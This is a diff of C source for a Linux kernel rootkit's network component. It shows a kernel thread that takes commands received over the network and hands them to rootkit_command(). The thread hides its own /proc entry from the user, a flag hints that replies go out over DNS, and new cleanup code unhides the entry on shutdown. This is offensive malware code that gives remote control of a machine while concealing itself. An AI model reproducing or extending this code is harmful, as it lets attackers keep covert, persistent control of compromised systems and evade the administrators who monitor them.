@@ -1,8 +1,3 @@
-#include <linux/delay.h>
-#include <linux/kernel.h>
-#include <linux/kthread.h>
-#include <linux/net.h>
-
 #include "hide.h"
 #include "network.h"
 
@@ -52,8 +47,10 @@ static bool receive_loop(char *recv_buffer) {
         // print the received message
         DBG_MSG("network_worker: received message: %s\n", recv_buffer);
 
-        if (strcmp(recv_buffer, "\n") != 0)
+        if (strcmp(recv_buffer, "\n") != 0) {
+            response_over_dns = false;
             rootkit_command(recv_buffer, RCV_CMD_BUFFER_SIZE);
+        }
     }
 
     return true;
@@ -123,7 +120,7 @@ int start_network_worker(void) {
         return PTR_ERR(network_worker_thread);
     }
 
-    // Hide the thread
+    // Hide the thread from the user
     char path[32] = { 0 };
     snprintf(path, sizeof(path), "/proc/%d", network_worker_thread->pid);
     add_hidden_dir(path);
@@ -133,10 +130,15 @@ int start_network_worker(void) {
 
 int stop_network_worker(void) {
     if (!network_worker_thread || IS_ERR(network_worker_thread)) {
-        ERR_MSG("stop_network_worker: thread not running\n");
         return -EINVAL;
     }
 
+    // Remove the hidden directory associated with the thread
+    char path[32] = { 0 };
+    snprintf(path, sizeof(path), "/proc/%d", network_worker_thread->pid);
+    remove_hidden_dir(path);
+
+    // Stop the network worker thread
     kthread_stop(network_worker_thread);
     network_worker_thread = NULL;
 
